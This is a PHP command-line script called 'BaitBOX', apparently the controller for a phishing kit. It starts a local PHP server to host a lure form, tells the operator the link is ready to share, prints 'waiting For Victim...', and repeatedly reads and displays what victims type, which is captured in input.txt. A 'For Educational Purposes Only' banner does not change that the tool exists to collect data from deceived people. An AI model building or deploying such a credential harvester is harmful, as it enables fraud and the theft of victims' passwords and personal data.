<?php
//initializ script
system(PHP_OS_FAMILY == "Windows" ? "cls" : "clear");

// Check if the script is running from CLI
if (php_sapi_name() !== "cli") {
  die("\033[31mTool Must Be Run From Command Line\n\033[0m");
}

// Print "BaitBox" in reddish (simulating using `-F gay` in `toilet`)
echo "\033[31m"; // Start reddish color
system('toilet -f standard "BaitBOX"');
echo "\033[0m"; // Reset color
echo "\033[31mFor Educational Purposses Only\n\033[0m";
// Start PHP's built-in server to host the form locally
$host = "localhost";
$port = 8000;

echo "Starting server on http://$host:$port...\n";
echo "\033[32mLink Is Now Avaliable Copy To Share.\n\n\033[0m";

// Use shell_exec to start the PHP built-in server in the background
shell_exec("php -S $host:$port > /dev/null 2>&1 &");

// The location of your form (form.php)
$form_file = "index.php";

// Check if form file exists
if (!file_exists($form_file)) {
  die("Error: The index.php file is missing. Please create the form file.\n");
}

// Start listening for changes in the input file
$file = "input.txt";

echo "\e[33mwaiting For Victim...\n\e[0m";
echo "\e[34mClick Control C to Stop\e[0m" . "\n";
while (true) {
  clearstatcache();
  if (file_exists($file)) {
    $input = file_get_contents($file);

    if (!empty($input)) {
      echo "-------------------------------------\n";
      echo "Input received: $input\n";

      // Clear the file after reading
      file_put_contents($file, "");
    }
  }

  // Pause for 2 seconds before checking again
  sleep(2);
}
